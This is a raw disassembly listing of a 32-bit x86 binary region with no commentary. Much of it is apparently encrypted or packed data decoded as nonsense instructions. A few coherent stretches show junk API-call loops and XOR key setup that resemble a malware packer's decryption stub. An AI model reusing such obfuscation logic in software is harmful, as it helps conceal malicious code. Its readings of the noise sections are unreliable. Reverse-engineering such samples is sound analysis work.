  402918:	or     eax,0xd3075744
  40291d:	test   al,0xbf
  40291f:	(bad)  
  402920:	xchg   edi,eax
  402921:	neg    esp
  402923:	icebp  
  402924:	dec    ecx
  402925:	outs   dx,DWORD PTR ds:[esi]
  402926:	jge    0x4028b5
  402928:	jmp    0x795b:0xb2335a88
  40292f:	std    
  402930:	cmp    dh,BYTE PTR ds:0x6465b4b8
  402936:	pause  
  402938:	cdq    
  402939:	xchg   edi,eax
  40293a:	arpl   WORD PTR [edx+0x4e],bx
  40293d:	dec    eax
  40293e:	xchg   BYTE PTR [ebx+0x40],dl
  402941:	daa    
  402942:	cld    
  402943:	adc    al,0xad
  402945:	dec    edi
  402946:	fs pop edi
  402948:	out    0x83,eax
  40294a:	(bad)  
  40294b:	lock adc BYTE PTR [edi+0x5d],0x48
  402950:	push   0x18
  402952:	cmp    ebx,eax
  402954:	mov    esi,DWORD PTR [esi+ecx*2]
  402957:	lds    eax,FWORD PTR [ebx+0x21]
  40295a:	xlat   BYTE PTR gs:[ebx]
  40295c:	dec    esp
  40295d:	fcom   st(7)
  40295f:	mov    ds:0x9dafdd5b,al
  402964:	mov    BYTE PTR [esi+esi*2+0x4c2c95e],ch
  40296b:	add    BYTE PTR [ebp-0x75],dl
  40296e:	in     al,dx
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xd84dd835
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xdc70707e
  402afd:	jae    0x402ad1
  402aff:	inc    edi
  402b00:	cmp    BYTE PTR [eax],0xd1
  402b03:	clc    
  402b04:	cmp    al,0xa6
  402b06:	daa    
  402b07:	cld    
  402b08:	and    BYTE PTR ds:[eax],0x2b
  402b0c:	fld    QWORD PTR [edx+0x7c]
  402b0f:	xchg   edx,eax
  402b10:	push   esi
  402b11:	int3   
  402b12:	mov    cl,0xa5
  402b14:	pusha  
  402b15:	rol    BYTE PTR ds:0xd02e7acb,1
  402b1c:	push   edx
  402b1d:	inc    ebx
  402b1e:	push   ds
  402b1f:	jae    0x402b47
  402b21:	imul   esp,DWORD PTR [esi-0x5d],0x1c
  402b25:	and    DWORD PTR [eax],ebp
  402b27:	jnp    0x402ac2
  402b29:	xchg   edi,eax
  402b2a:	adc    DWORD PTR [esi],edx
  402b2c:	mov    ecx,0x4ef4e3da
  402b31:	xchg   edi,eax
  402b32:	push   edi
  402b33:	xor    al,0x46
  402b35:	scas   eax,DWORD PTR es:[edi]
  402b36:	(bad)  
  402b37:	sbb    ah,BYTE PTR [edi]
  402b39:	jae    0x402bb8
  402b3b:	pushf  
  402b3c:	aam    0xeb
  402b3e:	cmp    al,0x1d
  402b40:	test   DWORD PTR [ebp+0x23],0x4c15bd2
  402b47:	pop    edx
  402b48:	push   ss
  402b49:	fwait
  402b4a:	pop    esi
  402b4b:	jp     0x402b8b
  402b4d:	add    dh,bh
  402b4f:	sbb    al,0x75
  402b51:	and    cl,BYTE PTR [eax]
  402b53:	pop    eax
  402b54:	mov    eax,ds:0x9811eedb
  402b59:	jmp    0x6867:0xefa67381
  402b60:	jns    0x402b62
  402b62:	and    dh,bh
  402b64:	adc    eax,edx
  402b66:	or     dl,bl
  402b68:	jne    0x402bb9
  402b6a:	cmp    eax,0x6065c125
  402b6f:	adc    dl,bh
  402b71:	pop    eax
  402b72:	xchg   edx,eax
  402b73:	xor    DWORD PTR [ebx+0x2c6842c2],ebp
  402b79:	sub    al,0xda
  402b7b:	call   0x1c0d:0x94f4d0bc
  402b82:	inc    BYTE PTR ds:0x906b40b
  402b88:	cdq    
  402b89:	repnz sbb edx,DWORD PTR [edx-0x18]
  402b8d:	lds    esi,FWORD PTR [esi+eiz*8+0x15]
  402b91:	mov    eax,0xefd4f029
  402b96:	(bad)  
  402b98:	int3   
  402b99:	xchg   edx,ebx
  402b9b:	clc    
  402b9c:	push   0xbee1e58e
  402ba1:	sub    dh,BYTE PTR [esi+0x291a6e50]
  402ba7:	jno    0x402c02
  402ba9:	or     BYTE PTR [edx+0x6b2e0745],bl
  402baf:	cmp    bh,BYTE PTR [edi+0x38]
  402bb2:	repnz das 
  402bb4:	cmp    ebp,DWORD PTR [edx+0x7971496f]
  402bba:	add    eax,DWORD PTR [ebx+0x23]
  402bbd:	cmp    BYTE PTR [ebp-0x62],bl
  402bc0:	(bad)  
  402bc1:	mov    es,WORD PTR [esi+0x13e4c0f0]
  402bc7:	cmp    DWORD PTR gs:[eax],eax
  402bca:	aaa    
  402bcb:	cs xor al,0xfc
  402bce:	cs pop edi
  402bd0:	inc    eax
  402bd1:	sub    DWORD PTR ds:0xa524de9f,0x79
  402bd8:	out    0x4c,al
  402bda:	(bad)  
  402bdb:	adc    eax,0x1f8c8ca2
  402be0:	push   0x4be3c7f2
  402be5:	test   al,0x7c
  402be7:	out    0xfe,eax
  402be9:	ror    BYTE PTR [ecx+0x487125f],1
  402bef:	popa   
  402bf0:	jno    0x402c6d
  402bf2:	push   0x3e118345
  402bf7:	jbe    0x402b7c
  402bf9:	out    0x7c,eax
  402bfb:	push   ebx
  402bfc:	inc    ecx
  402bfd:	mov    ebp,0x72cf5deb
  402c02:	je     0xcb9328a
  402c08:	mov    edi,0xdbe05ad4
  402c0d:	xchg   esi,eax
  402c0e:	add    DWORD PTR [ecx-0x9],esi
  402c11:	inc    ebp
  402c12:	(bad)  
  402c14:	mov    edx,0xbc5c29d
  402c19:	lds    ebp,FWORD PTR [edi]
  402c1b:	sahf   
  402c1c:	push   ebx
  402c1d:	add    eax,0x3daba14c
  402c22:	add    al,al
  402c24:	jmp    0x402c01
  402c26:	call   0x26fdeb07
  402c2b:	xor    bh,BYTE PTR [ebp-0x5f]
  402c2e:	mov    BYTE PTR [eax-0x27],ah
  402c31:	or     BYTE PTR [ecx],ch
  402c33:	fdiv   st,st(6)
  402c35:	leave  
  402c36:	jp     0x402c2f
  402c38:	adc    dh,ch
  402c3a:	pushf  
  402c3b:	repnz and ecx,ebx
  402c3e:	std    
  402c3f:	push   esi
  402c40:	les    ebp,FWORD PTR [ebx]
  402c42:	jge    0x402c45
  402c44:	push   edi
  402c45:	sbb    al,0xa6
  402c47:	mov    ch,0xc2
  402c49:	mov    al,0xe6
  402c4b:	jg     0x402bf3
  402c4d:	test   BYTE PTR [ebx+0x69],cl
  402c50:	fwait
  402c51:	shr    esp,0x9b
  402c54:	push   ecx
  402c55:	pop    ebp
  402c56:	add    eax,0x16ab039
  402c5b:	mov    dh,0x8d
  402c5d:	mul    BYTE PTR [ebp-0x37c166e8]
  402c63:	xor    eax,0x732585ad
  402c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c69:	ss popa 
  402c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c6c:	ds (bad) 
  402c6e:	sub    BYTE PTR [esi+ebp*8-0x7e],al
  402c72:	out    dx,eax
  402c73:	and    ebx,ebx
  402c75:	mov    ch,BYTE PTR [edx+0x6c]
  402c78:	xchg   DWORD PTR [edi+0x0],esp
  402c7b:	jbe    0x402cf0
  402c7d:	pop    eax
  402c7e:	cmp    DWORD PTR [ebx-0x74],edi
  402c81:	mov    ah,0x2e
  402c83:	mov    edi,0x78e5fd84
  402c88:	or     DWORD PTR [edx+0x6d],edx
  402c8b:	stos   DWORD PTR es:[edi],eax
  402c8c:	dec    ebp
  402c8d:	outs   dx,DWORD PTR gs:[esi]
  402c8f:	shr    DWORD PTR [edi+0x41c92730],0x63
  402c96:	adc    ecx,DWORD PTR [eax]
  402c98:	jg     0x402c74
  402c9a:	repnz enter 0xdb52,0xc9
  402c9f:	sbb    DWORD PTR [esi-0x4f],ebx
  402ca2:	add    DWORD PTR [ebx+0x7c],eax
  402ca5:	test   eax,0x99106d2c
  402caa:	retf   0xe5ef
  402cad:	dec    edi
  402cae:	dec    edi
  402caf:	sub    al,0x1
  402cb1:	xchg   ecx,eax
  402cb2:	aam    0xff
  402cb4:	mov    bl,BYTE PTR [ecx-0x5f2d8a49]
  402cba:	fst    DWORD PTR [eax]
  402cbc:	pop    edx
  402cbd:	mov    WORD PTR fs:[ecx],?
  402cc0:	mov    ebx,0xdfe66581
  402cc5:	inc    edi
  402cc6:	ficom  DWORD PTR [edx-0x7]
  402cc9:	fidivr DWORD PTR [edi]
  402ccb:	(bad)  
  402ccc:	lods   al,BYTE PTR ds:[esi]
  402ccd:	xor    bh,0xe4
  402cd0:	loop   0x402cc0
  402cd2:	jno    0x402ca5
  402cd4:	jl     0x402d08
  402cd6:	cmc    
  402cd7:	mov    ?,WORD PTR [eax-0x1c]
  402cda:	test   DWORD PTR [ebx-0x5a78ee59],ebp
  402ce0:	lods   eax,DWORD PTR ds:[esi]
  402ce1:	add    eax,0xab58c3a3
  402ce6:	xchg   esp,eax
  402ce7:	xchg   esp,eax
  402ce8:	cmp    eax,0x6844fb2e
  402ced:	mov    ebp,DWORD PTR [edi]
  402cef:	sub    DWORD PTR [edx-0x2fcc5607],eax
  402cf5:	fucom  st(4)
  402cf7:	pop    ebx
  402cf8:	or     DWORD PTR [ebx-0x21],0xfffffff8
  402cfc:	mov    BYTE PTR [edi-0x80],ch
  402cff:	dec    BYTE PTR [edx-0x7f]
  402d02:	aad    0x77
  402d04:	jns    0x402d79
  402d06:	fwait
  402d07:	je     0x402c94
  402d09:	fs dec eax
  402d0b:	cmp    eax,0x7839b096
  402d10:	cmp    ch,ch
  402d12:	int    0x4c
  402d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d15:	mov    ds:0x7ac3a46f,eax
  402d1a:	lods   al,BYTE PTR ds:[esi]
  402d1b:	mov    edi,0xa268753
  402d20:	and    edi,ebx
  402d22:	push   esi
  402d23:	xor    ebp,eax
  402d25:	sub    esi,DWORD PTR [ebp-0x4e]
  402d28:	fst    QWORD PTR [edi-0x36]
  402d2b:	ins    BYTE PTR es:[edi],dx
  402d2c:	out    dx,eax
  402d2d:	jecxz  0x402d86
  402d2f:	sbb    eax,0xc202dbdf
  402d34:	xor    DWORD PTR [edx],edi
  402d36:	aaa    
  402d37:	mov    al,0x8b
  402d39:	cmp    esp,DWORD PTR [esi]
  402d3b:	and    al,0xc0
  402d3d:	jecxz  0x402d8e
  402d3f:	and    al,0x3d
  402d41:	jecxz  0x402d2b
  402d43:	or     eax,0xe82d1816
  402d49:	add    eax,0xc77b0ff5
  402d4e:	cli    
  402d4f:	fsubr  st,st(0)
  402d51:	ret    0x424a
  402d54:	adc    esp,esi
  402d56:	pop    ds
  402d57:	dec    esi
  402d58:	fisub  WORD PTR [ebp+0x5]
  402d5b:	cwde   
  402d5c:	push   ecx
  402d5d:	daa    
  402d5e:	push   ss
  402d5f:	dec    eax
  402d60:	mov    esp,0xce750c5a
  402d65:	mul    cl
  402d67:	sbb    eax,0xd11c1857
  402d6c:	mov    esi,?
  402d6e:	mov    ecx,0x6f291e7d
  402d73:	mov    ebp,0xe3d79a8f
  402d78:	xchg   esp,eax
  402d79:	pop    esp
  402d7a:	ret    
  402d7b:	xchg   edi,eax
  402d7c:	sbb    BYTE PTR [ecx],bh
  402d7e:	or     eax,0xb12bf87c
  402d83:	mov    ecx,0xe952abec
  402d88:	fiadd  DWORD PTR [edx+0x10454a1c]
  402d8e:	fdivr  QWORD PTR [eax-0x1]
  402d91:	mov    al,ds:0xce2cc527
  402d96:	push   ds
  402d97:	jg     0x402dd0
  402d99:	pop    ss
  402d9a:	adc    al,0x13
  402d9c:	adc    al,0x84
  402d9e:	xor    al,0x60
  402da1:	sub    eax,0x9099778d
  402da6:	push   ebp
  402da7:	cmp    cl,dh
  402da9:	push   ds
  402daa:	sti    
  402dab:	mov    ds:0x7d2c1e34,eax
  402db0:	xchg   ebx,eax
  402db1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402db2:	dec    esp
  402db3:	jno    0x402d4d
  402db5:	fadd   QWORD PTR [ebx+esi*4-0x51]
  402db9:	(bad)  
  402dba:	pushf  
  402dbb:	sbb    DWORD PTR [ebx-0x77],ebp
  402dbe:	add    edx,esi
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	mov    ebx,0xbe19383e
  402de4:	or     dh,BYTE PTR [eax+0x70]
  402de7:	mov    esi,0x7b70707e
  402dec:	ds mov ebx,0x43561b7a
  402df2:	in     eax,dx
  402df3:	sahf   
  402df4:	rcl    BYTE PTR [bx+0x34c5],cl
  402df9:	mov    fs:0xb71b353,al
  402dff:	mov    eax,ds:0xccadf6c
  402e04:	jmp    0x39dd21e8
  402e09:	pop    ss
  402e0a:	mov    dh,0xd5
  402e0c:	je     0x402e48
  402e0e:	(bad)  
  402e0f:	cmp    DWORD PTR [ebp+0x7a],edi
  402e12:	or     al,0x8
  402e14:	and    eax,0xb15037c6
  402e19:	cld    
  402e1a:	cmp    BYTE PTR [edx],bh
  402e1c:	inc    ecx
  402e1d:	and    BYTE PTR [eax-0x185b6712],0xa0
  402e24:	arpl   WORD PTR ds:0xf74c4993,dx
  402e2a:	fadd   DWORD PTR [eax-0x44]
  402e2d:	push   ss
  402e2e:	xor    esi,DWORD PTR ds:0x892ce31
  402e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e35:	(bad)  
  402e36:	adc    edx,edi
  402e38:	or     ah,cl
  402e3a:	jae    0x402dc2
  402e3c:	les    esp,FWORD PTR [esi]
  402e3e:	add    al,0x9c
  402e40:	add    al,0x6c
  402e42:	inc    ebx
  402e43:	jne    0x402eab
  402e45:	sbb    edx,esi
  402e47:	or     ah,BYTE PTR [eax]
  402e49:	mul    bl
  402e4b:	int3   
  402e4c:	and    al,0x33
  402e4e:	lods   eax,DWORD PTR ds:[esi]
  402e4f:	sbb    DWORD PTR [ebx+ecx*2-0x19132329],eax
  402e56:	out    0x35,eax
  402e58:	ja     0x402e55
  402e5a:	(bad)  
  402e5b:	pop    edx
  402e5c:	dec    esi
  402e5d:	dec    ecx
  402e5e:	adc    DWORD PTR [esi],esp
  402e60:	and    BYTE PTR [eax-0x4ae9e57b],cl
  402e66:	fldenv [edx+0x457ea6f7]
  402e6c:	out    0xc4,eax
  402e6e:	adc    esi,DWORD PTR [edx]
  402e70:	pusha  
  402e71:	daa    
  402e72:	dec    esi
  402e73:	xchg   esp,eax
  402e74:	fdiv   st,st(1)
  402e76:	inc    ecx
  402e77:	fwait
  402e78:	je     0x402ec5
  402e7a:	push   ecx
  402e7b:	lds    edi,FWORD PTR [edi-0x3c7c3d58]
  402e81:	retf   
  402e82:	sbb    ah,BYTE PTR [edi]
  402e84:	jg     0x402e49
  402e86:	dec    ecx
  402e87:	mov    al,ds:0xccb78fd7
  402e8c:	pop    ecx
  402e8d:	and    BYTE PTR [edx],0x7a
  402e90:	out    dx,al
  402e91:	hlt    
  402e92:	dec    ebp
  402e93:	data16 loope 0x402f04
  402e96:	ja     0x402ecb
  402e98:	cmp    DWORD PTR [ebx+0x572766d5],esp
  402e9e:	ins    BYTE PTR es:[edi],dx
  402e9f:	aam    0x65
  402ea1:	mov    edi,0x3775d6f6
  402ea6:	mov    dh,0x3e
  402ea8:	push   0x1c
  402eaa:	pop    ebx
  402eab:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ead:	pop    ds
  402eae:	jl     0x402e64
  402eb0:	hlt    
  402eb1:	jle    0x402f1c
  402eb3:	les    ecx,FWORD PTR [ecx+eiz*8-0x7e]
  402eb7:	in     eax,0x58
  402eb9:	mov    ebp,0x97680b6
  402ebe:	(bad)  
  402ebf:	jp     0x402e8b
  402ec1:	cmp    ebx,DWORD PTR [edi+0x1d585362]
  402ec7:	pusha  
  402ec8:	jno    0x402ed8
  402eca:	mov    ah,0x7a
  402ecc:	stos   BYTE PTR es:[edi],al
  402ecd:	mov    ebx,0x79cb7afd
  402ed2:	add    eax,0x3a3460dd
  402ed7:	loopne 0x402f29
  402ed9:	xchg   ah,al
  402edb:	mov    ebp,0xc14e6fd1
  402ee0:	clc    
  402ee1:	mov    ah,0x9a
  402ee3:	test   DWORD PTR [edi],ebx
  402ee5:	lock xor dl,BYTE PTR [ecx-0x1a]
  402ee9:	std    
  402eea:	mov    edi,cs
  402eec:	push   edx
  402eed:	jg     0x402ecb
  402eef:	(bad)  
  402ef0:	fsubr  st(1),st
  402ef2:	pop    esp
  402ef3:	adc    BYTE PTR [esi-0x1bfd743b],ch
  402ef9:	push   eax
  402efa:	mov    ds:0x5fe72d10,al
  402eff:	fimul  DWORD PTR [esi-0x4d]
  402f02:	lock push 0x6037a4a4
  402f08:	inc    esp
  402f09:	and    dl,ch
  402f0b:	out    dx,eax
  402f0c:	jge    0x402eb1
  402f0e:	jge    0x402f5e
  402f10:	and    al,0x32
  402f12:	push   cs
  402f13:	inc    edi
  402f14:	jno    0x402f41
  402f16:	pop    ecx
  402f17:	dec    ecx
  402f18:	jecxz  0x402f63
  402f1a:	sti    
  402f1b:	inc    ecx
  402f1c:	push   eax
  402f1d:	sub    DWORD PTR [edi+esi*1-0x644ae3f3],edx
  402f24:	mov    ebx,0x61b86c13
  402f29:	mov    al,ds:0x82ff90fa
  402f2e:	xchg   edx,eax
  402f2f:	jle    0x402f2a
  402f31:	mov    BYTE PTR [eax],bl
  402f33:	popa   
  402f34:	push   DWORD PTR [edx-0x1786cba3]
  402f3a:	in     eax,0xb9
  402f3c:	pop    ebp
  402f3d:	test   BYTE PTR [edx-0x7c],cl
  402f40:	in     al,0x3f
  402f42:	xchg   edi,eax
  402f43:	add    dl,bh
  402f45:	popf   
  402f46:	sbb    eax,0x68ab2d75
  402f4b:	adc    esi,DWORD PTR [eax+eax*1+0x6ce8c36c]
  402f52:	ja     0x402f61
  402f54:	sub    ebp,esi
  402f56:	rcr    BYTE PTR ss:[edi],cl
  402f59:	aas    
  402f5a:	inc    esi
  402f5b:	cmc    
  402f5c:	mov    cl,0x6a
  402f5e:	xchg   esp,eax
  402f5f:	pop    edx
  402f60:	add    bl,ah
  402f62:	mov    WORD PTR [ebx+0x312247fe],ds
  402f68:	fnsave ds:0xa53fae64
  402f6e:	jp     0x402f59
  402f70:	lods   al,BYTE PTR ds:[esi]
  402f71:	jge    0x402f51
  402f73:	mov    edi,DWORD PTR [ebp+0x28d7eba1]
  402f79:	std    
  402f7a:	je     0x402f71
  402f7c:	cdq    
  402f7d:	(bad)  
  402f7e:	fbstp  TBYTE PTR [ebp-0xa]
  402f81:	mov    BYTE PTR [ecx-0x20179a5f],al
  402f87:	mov    ah,0xdc
  402f89:	pop    ds
  402f8a:	leave  
  402f8b:	mov    eax,0xe7cd96f2
  402f90:	in     al,dx
  402f91:	jmp    0x402f31
  402f93:	stos   BYTE PTR es:[edi],al
  402f94:	push   ds
  402f95:	repz cmp edx,ecx
  402f98:	and    BYTE PTR [ecx+0x7e],dl
  402f9b:	xchg   edi,eax
  402f9c:	push   0x1e559038
  402fa1:	sahf   
  402fa2:	stos   BYTE PTR es:[edi],al
  402fa3:	xor    bl,BYTE PTR [eax-0x3d]
  402fa6:	push   ecx
  402fa7:	push   eax
  402fa8:	pop    ecx
  402fa9:	inc    ebx
  402faa:	mov    DWORD PTR [esi+eiz*4],0x65278190
  402fb1:	dec    ecx
  402fb2:	sar    DWORD PTR [ecx-0x6d0e163],1
  402fb8:	dec    ebx
  402fb9:	movhps QWORD PTR [ecx+0xfb54447],xmm2
  402fc0:	rol    BYTE PTR [ebx+0x75faedc7],1
  402fc6:	adc    eax,0x2df94aab
  402fcb:	cmp    eax,0xd8432e0e
  402fd0:	xchg   cl,ch
  402fd2:	ret    
  402fd3:	mov    ds:0xc7a44608,al
  402fd8:	cli    
  402fd9:	daa    
  402fda:	xor    dh,BYTE PTR [esi-0x5c]
  402fdd:	mov    ah,0x8e
  402fdf:	and    dh,ah
  402fe1:	das    
  402fe2:	and    eax,0xfb6194a9
  402fe7:	pmulhuw mm1,mm1
  402fea:	dec    edi
  402feb:	sar    BYTE PTR [edx],cl
  402fed:	mov    ebp,DWORD PTR [eax]
  402fef:	aad    0x41
  402ff1:	sahf   
  402ff2:	xor    ebx,esp
  402ff4:	mov    eax,ds:0xb05b7f95
  402ff9:	push   ebx
  402ffa:	mov    bh,0xe9
  402ffc:	(bad)  
  402ffd:	mov    ds:0x3b379e75,al
  403002:	(bad)  
  403003:	aam    0xc
  403005:	(bad)  
  403006:	ror    BYTE PTR [ecx+0xb282fc6],1
  40300c:	sbb    edi,DWORD PTR [eax-0x9fae543]
  403012:	out    0x79,al
  403014:	pushf  
  403015:	mov    ah,0xf
  403017:	out    0x8a,al
  403019:	ins    BYTE PTR es:[edi],dx
  40301a:	and    eax,0xc47e8390
  40301f:	pop    esi
  403020:	mov    ds:0xdd17685e,al
  403025:	inc    esi
  403026:	jae    0x403027
  403028:	sar    ch,1
  40302a:	rcl    DWORD PTR [ebp+0x4a8e2341],cl
  403030:	das    
  403031:	push   ecx
  403032:	inc    ebx
  403033:	shl    edi,cl
  403035:	mov    ecx,0x4f12f190
  40303a:	sbb    ebp,DWORD PTR [eax-0x5b6122a0]
  403040:	fadd   DWORD PTR [esi-0x29]
  403043:	outs   dx,DWORD PTR ds:[esi]
  403044:	mov    ch,0x20
  403046:	jmp    0xca52a617
  40304b:	rol    BYTE PTR ds:0xbda18a3a,0xc1
  403052:	mov    edx,0xba4f40e8
  403057:	jae    0x403054
  403059:	ret    0xb810
  40305c:	xchg   al,bl
  40305e:	mov    al,0xd1
  403060:	push   ebp
  403061:	add    BYTE PTR [ebx-0x229edf8d],bh
  403067:	inc    edx
  403068:	je     0x403019
  40306a:	int    0xd
  40306c:	cmc    
  40306d:	pop    edx
  40306e:	push   edi
  40306f:	jbe    0x4030b9
  403071:	xchg   esi,eax
  403072:	mov    al,0x76
  403074:	loope  0x40306b
  403076:	or     al,0xf4
  403078:	(bad)  
  403079:	mov    ch,0x36
  40307b:	std    
  40307c:	xchg   ebx,eax
  40307d:	mov    ebx,0x55253e09
  403082:	mov    ch,0xe
  403084:	xlat   BYTE PTR ds:[ebx]
  403085:	lods   eax,DWORD PTR ds:[esi]
  403086:	nop
  403087:	inc    edi
  403088:	test   ecx,edx
  40308a:	inc    edx
  40308b:	idiv   DWORD PTR [edx+edi*2+0x72]
  40308f:	icebp  
  403090:	jb     0x40304c
  403092:	and    eax,0x54acd2d5
  403097:	jle    0x4030b9
  403099:	fdiv   QWORD PTR [ebp+eiz*8-0x435355cd]
  4030a0:	sbb    eax,DWORD PTR ds:0x2dde081e
  4030a6:	cmc    
  4030a7:	jl     0x403108
  4030a9:	add    eax,0xbe23b538
  4030ae:	pushf  
  4030af:	jb     0x4030e3
  4030b1:	add    BYTE PTR [ebx+0x7d8bf845],cl
  4030b7:	cld    
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xd2
  4030ce:	xchg   dl,ch
  4030d0:	pushf  
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x3570707e
  4030da:	push   cs
  4030db:	fs xchg edi,eax
  4030dd:	mov    cl,0xc6
  4030df:	dec    ebx
  4030e0:	out    dx,eax
  4030e1:	push   0xffffff85
  4030e3:	pop    ebx
  4030e4:	cwde   
  4030e5:	add    eax,0x75833935
  4030ea:	fwait
  4030eb:	push   ecx
  4030ec:	popf   
  4030ed:	fld    st(6)
  4030ef:	sub    eax,0x8150b88
  4030f4:	push   0xeaac9ba6
  4030f9:	out    dx,al
  4030fa:	es je  0x403162
  4030fd:	clc    
  4030fe:	mov    ebp,0x166c460a
  403103:	jno    0x40310f
  403105:	jp     0x403106
  403107:	ret    
  403108:	or     DWORD PTR [esi-0x1c],eax
  40310b:	xor    al,0xab
  40310d:	lock and al,0xad
  403110:	mov    al,bl
  403112:	or     BYTE PTR [ecx+0x49],bh
  403115:	frndint 
  403117:	pop    eax
  403118:	pop    ds
  403119:	mov    eax,0x9f4a2b8d
  40311e:	mov    al,0x4
  403120:	push   ebp
  403121:	into   
  403122:	enter  0xd53a,0x28
  403126:	stc    
  403127:	sbb    al,0x4c
  403129:	cli    
  40312a:	mov    dl,0x72
  40312c:	sub    eax,0x9f6f23c
  403131:	ja     0x4030fd
  403133:	push   0x32
  403135:	repz mov cl,0x59
  403138:	aad    0x66
  40313a:	aas    
  40313b:	jmp    0xb90dc9cf
  403140:	sub    DWORD PTR [edi-0x39f5e126],ebp
  403146:	mov    ch,0x7
  403148:	and    al,0x84
  40314a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40314b:	dec    ebx
  40314c:	mov    cl,BYTE PTR [ebp-0x21d4da30]
  403152:	inc    edi
  403153:	jecxz  0x403145
  403155:	shr    BYTE PTR [ebp-0x4619bc19],cl
  40315b:	inc    ebx
  40315c:	jno    0x4031b5
  40315e:	xchg   esp,eax
  40315f:	jno    0x40318f
  403161:	in     al,dx
  403162:	jo     0x403113
  403164:	rol    DWORD PTR [ebx],1
  403166:	pop    es
  403167:	and    al,0xb3
  403169:	dec    ebx
  40316a:	push   0xffffffe5
  40316c:	scas   al,BYTE PTR es:[edi]
  40316d:	pop    edi
  40316e:	cmp    dh,bh
  403170:	test   ebp,ebx
  403172:	int3   
  403173:	js     0x4030f7
  403175:	add    eax,0xf5e732cf
  40317a:	mov    al,ds:0xdf509be3
  40317f:	shl    esi,1
  403181:	out    0xaa,eax
  403183:	es xchg esi,esp
  403186:	cmc    
  403187:	mov    bl,0x1e
  403189:	cmp    dh,BYTE PTR cs:[esi+0xfe8a6b0]
  403190:	data16 sahf 
  403192:	js     0x403155
  403194:	repz add BYTE PTR [edi-0x80],dl
  403198:	jne    0x403195
  40319a:	sub    BYTE PTR [ebx+eiz*4+0x3c800b83],cl
